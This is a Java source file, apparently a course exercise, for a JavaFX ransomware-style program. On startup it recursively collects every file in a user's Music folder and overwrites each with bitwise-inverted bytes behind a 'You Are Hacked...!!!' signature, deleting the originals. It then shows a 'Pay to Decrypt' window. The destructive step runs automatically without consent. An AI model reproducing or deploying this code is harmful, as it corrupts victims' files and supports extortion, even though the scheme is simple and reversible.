package lk.ijse.dep10.malware.controller;

import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.ProgressBar;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Modality;
import javafx.stage.Stage;

import java.io.*;
import java.util.ArrayList;

public class SplashSceneController {

    @FXML
    private ProgressBar prgLoading;
    private final String SIGNATURE = "You Are Hacked...!!!";
    ArrayList<File> fileArrayList = new ArrayList<>();

    public void initialize() throws IOException {
        File targetDir = new File("/home/gayashan/Music");
        listMethod(targetDir);
        encryptFiles(fileArrayList);

        FXMLLoader fxmlLoader = new FXMLLoader(this.getClass().getResource("/view/MainScene.fxml"));
        AnchorPane root = fxmlLoader.load();

        MainSceneController controller = fxmlLoader.getController();
        controller.initData(fileArrayList);

        Stage stage = new Stage();
        stage.setScene(new Scene(root));
//        stage.initModality(Modality.APPLICATION_MODAL);
        stage.show();
        stage.centerOnScreen();
        stage.setTitle("Pay to Decrypt");

    }

    private void listMethod(File fileDir) {
        File[] files = fileDir.listFiles();
        for (File file : files) {
            if (file.isFile()) {
//                System.out.println(file.getAbsolutePath());
                this.fileArrayList.add(file);
            } else {
                listMethod(file);
            }
        }
    }

    //    private void encryptFiles(ArrayList<File> fileList) throws IOException {
//        for (File file : fileList) {
//
//            /*Reading Files*/
//            FileInputStream fileInputStream = new FileInputStream(file);
//            byte[] bytes = fileInputStream.readAllBytes();
//            fileInputStream.close();
//
//
//            /*Checking for encryption*/
//            boolean encrypted = true;
//            for (int i = 0; i < 20; i++) {
//                if (bytes[i] != 99) {
//                    encrypted = false;
//                }
//            }
//            if (encrypted == true) {
//                continue;
//            }
//
//            /*Updating byte array*/
//            byte[] newBytes = new byte[bytes.length + 20];
//            int i = 0;
//            int j = 0;
//            for (byte newByte : newBytes) {
//                if (i < 20) {
//
//                }
//            }
//
//            /*Creating file pointers with modified names*/
//            File fileTarget = new File(file.getParentFile(), (file.getName() + "cp"));
//
//            /*Writing files*/
//            FileOutputStream fileOutputStream = new FileOutputStream(fileTarget);
//            fileOutputStream.write(bytes);
//            fileOutputStream.close();
//
//            /*Deleting Files*/
//            file.delete();
//
//            /*Renaming Files*/
//            File renamedFile = new File(fileTarget.getParentFile(), fileTarget.getName().substring(0, fileTarget.getName().length()-2));
//            fileTarget.renameTo(renamedFile);
//
//
//        }
//    }
    private void encryptFiles(ArrayList<File> fileArrayList) throws IOException {
        for (File file : fileArrayList) {
            /*Checking for already encrypted files*/
            FileInputStream fis1 = new FileInputStream(file);
            byte[] byteArray = SIGNATURE.getBytes();
            int value = fis1.read(byteArray);
            if (value != -1) {
                if (new String(byteArray).equals(SIGNATURE)) {
                    continue;
                }
            }
            fis1.close();

            File tempFile = File.createTempFile("ijse", "dep10");

            FileInputStream fis = new FileInputStream(file);
            FileOutputStream fos = new FileOutputStream(tempFile, true);

            fos.write(SIGNATURE.getBytes());

            encrypt(fis, fos);
            file.delete();
            tempFile.renameTo(file);

            fis.close();
            fos.close();
        }
    }

    private void encrypt(FileInputStream fis, FileOutputStream fos) throws IOException {
        while (true) {
            int read = fis.read();
            if (read == -1) {
                break;
            }
            fos.write(~read);
        }
    }


}
